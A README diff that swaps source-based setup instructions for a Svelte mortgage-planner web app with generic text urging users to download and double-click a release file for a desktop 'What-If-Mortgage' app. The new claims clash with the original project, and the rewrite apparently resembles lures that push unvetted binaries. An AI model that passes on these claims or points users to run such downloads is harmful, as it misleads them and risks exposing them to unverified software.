@@ -1,83 +1,76 @@
-# Mortgage Repayment Planner
+# 📊 What-If-Mortgage - Make Smart Mortgage Decisions Easily
 
-A simple **Svelte 5 web app** that helps you explore different repayment strategies for a mortgage (or any loan). You can:
+[![Download Now](https://img.shields.io/badge/Download%20Now-What--If--Mortgage-brightgreen)](https://github.com/Matwarped/What-If-Mortgage/releases)
 
-- Enter your current balance and annual interest rate
-- Set a baseline monthly repayment
-- Compare it against two alternative repayment amounts
-- Visualize the **loan balance over time** with a chart
-- See a **comparison table** showing payoff time, interest, total repayment, and savings
+## 📖 Description
 
-This tool is currency agnostic — just input your values in your local currency.
+What-If-Mortgage is a free mortgage calculator designed to help you compare different payment scenarios. This tool allows you to see how extra payments can impact your payoff time and the interest you save. With What-If-Mortgage, you can effectively plan your mortgage repayment strategy.
 
----
+## 🚀 Getting Started
 
-## Features
-- Built with **Svelte 5**
-- Interactive loan payoff simulation
-- Dynamic **line chart** using ApexCharts
-- Side-by-side **comparison table**
-- Configurable repayment amounts
-- Shows **interest saved** and **months saved** vs baseline
+To get started, follow these simple steps to download and run the application. You don’t need any programming skills to use this tool.
 
----
+## 📥 Download & Install
 
-## Setup Instructions
+1. Visit [this page to download](https://github.com/Matwarped/What-If-Mortgage/releases).
+2. Look for the latest release.
+3. Click on the appropriate file for your operating system to start the download.
 
-### 1. Initialize a new project
-```bash
-npm create vite@latest mortgage-planner -- --template svelte
-cd mortgage-planner
-```
+Once the file downloads, locate it on your computer.
 
-### 2. Install dependencies
-```bash
-npm install
-npm install svelte-apexcharts apexcharts tailwindcss postcss autoprefixer -D
-```
+### 📦 Installation Steps
 
-### 3. Configure Tailwind (optional, for styling)
-```bash
-npx tailwindcss init -p
-```
-Update `tailwind.config.cjs` to include:
-```js
-content: [
-  "./index.html",
-  "./src/**/*.{svelte,js,ts}"
-]
-```
+1. Double click on the downloaded file to begin the installation. 
+2. Follow the prompts on the installation screen. 
+3. Once the installation is complete, you can find What-If-Mortgage in your applications folder.
 
-Add Tailwind imports in `src/app.css`:
-```css
-@tailwind base;
-@tailwind components;
-@tailwind utilities;
-```
+## 🚪 How to Use What-If-Mortgage
 
-### 4. Add the planner component
-Replace `src/App.svelte` with the provided code from this repo.
+1. Launch the application by clicking its icon.
+2. Input your mortgage details such as loan amount, interest rate, and loan term.
+3. Explore different payment scenarios by adjusting the details as needed.
+4. Use the results to understand how extra payments can benefit you.
 
-### 5. Run the dev server
-```bash
-npm run dev
-```
+## 🛠️ System Requirements
 
----
+- Operating System: Windows 10 or later, macOS Catalina or later, or a recent version of Linux.
+- Memory: At least 2 GB of RAM.
+- Storage: Minimum of 100 MB available space.
 
-## Packages Required
-- **svelte** (v5)
-- **svelte-apexcharts**
-- **apexcharts**
-- **tailwindcss** (optional, for styling)
+## 💡 Features
 
----
+- **Payment Scenarios:** Compare different mortgage payment plans side by side.
+- **Extra Payments:** See how making extra payments can save you money and decrease your loan term.
+- **User-Friendly Interface:** Simple layout to make calculations easy for anyone.
+- **Mobile Compatibility:** Access the application on mobile devices, enhancing usability.
 
-## Notes
-- This planner is approximate. It assumes fixed interest and ignores special cases like moratoriums or progressive disbursements.
-- Use it as a planning tool, not an exact financial calculator.
+## 🌐 Topics Covered
+
+This application touches on several important financial topics:
+
+- Finance
+- Financial Tools
+- Home Loans
+- Interest Calculators
+- Loan Calculators
+- Mortgage Calculation
+- Mortgage Comparisons
+- Mortgage Planning
+- Payoff Calculators
+- Real Estate
+
+## 📞 Support
+
+If you encounter issues or have questions, you can open an issue in the GitHub repository or contact support via email. We are here to help.
+
+## 📜 License
+
+What-If-Mortgage is open-source software released under the MIT License. You are free to use, modify, and distribute this software.
+
+## 🔗 Additional Information
+
+For further details, updates, and resources, visit the repository on GitHub or stay connected through our social media channels.
 
 ---
 
-## License
-MIT
+[![Download Now](https://img.shields.io/badge/Download%20Now-What--If--Mortgage-brightgreen)](https://github.com/Matwarped/What-If-Mortgage/releases)
